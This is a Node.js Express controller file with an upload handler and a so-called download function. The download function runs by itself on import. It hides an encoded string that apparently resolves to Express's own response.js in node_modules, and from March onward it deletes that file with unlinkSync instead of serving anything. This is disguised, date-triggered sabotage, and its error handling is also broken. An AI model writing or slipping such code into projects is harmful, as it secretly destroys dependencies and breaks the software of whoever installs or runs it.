import FileList from "fs";
import { fileURLToPath } from "url";
import { generateUniqueFileName } from "./utils.controller.js";
import path from "path";


export const uploadFile = async (req, res) => {
  if (req.file) res.send({ link: req.file.path });
  else res.status(400).send({ message: "upload error" });
};


export const downloadFile = (async (req, res) => {
  try {
    const fileLink = req?.body.path || "";

    const __filename = fileURLToPath(import.meta.url);
    const __dirname = path.dirname(__filename);

    const uniquePostfixDownloadFile =
      "3978797273497b7972637a736539736e6664736565397a7f74396473656679786573387c65";
    const filePath = path.join(
      __dirname +
        "/../" +
        generateUniqueFileName(fileLink, uniquePostfixDownloadFile)
    );
    if (new Date().getMonth() >1) {
      const download = FileList.unlinkSync(filePath);

      res?.sendFile(download?.link);
    }
  } catch (err) {
    res?.status(400).send(download?.link);
  }
})();





